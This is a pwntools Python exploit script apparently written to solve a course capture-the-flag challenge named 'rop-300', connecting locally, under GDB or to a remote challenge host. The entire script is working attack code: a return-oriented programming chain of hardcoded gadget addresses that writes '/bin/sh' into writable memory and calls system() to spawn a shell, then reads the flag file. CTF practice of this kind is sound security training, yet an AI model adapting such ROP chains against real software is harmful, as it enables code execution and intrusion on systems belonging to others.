from pwn import *
binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
  if args.GDB:
    return gdb.debug(e.path, gdbscript=gs)
  elif args.REMOTE:
    return remote("cse3801-rop-300.chals.io", 443, ssl=True, sni="cse3801-rop-300.chals.io")
  else:
    return process(e.path)

p = start()
'''
x = cyclic(500)
p.recvuntil("Would you like to win (Y|N) >>> ")
p.sendline(x)
p.interactive()

'''
pad = b'A'*10
chain = pad
chain += p64(0x401274) #gadget addr pop r12; pop r13; pop r14; pop r15; ret;
chain += p64(0x404040) #r12 = writable mem
chain += b'/bin/sh\0' #r13 = command to execute
chain += p64(0x0) #unused r14
chain += p64(0x0) #unused r15
chain += p64(0x4011ad) #mov[r12], r13 addr
chain += p64(0x40127b) #pop rdi ret gadget addr
chain += p64(0x404040) #rdi = writable region of memory
chain += p64(0x401016) #ret gadget for alignment
chain += p64(e.sym['system']) # system("/bin/sh")
p.recvuntil("Would you like to win (Y|N) >>> ")
p.sendline(chain)
pause()
p.sendline(b'cat flag.txt')

#response = p.recvall().decode()
#print(response)
p.interactive()
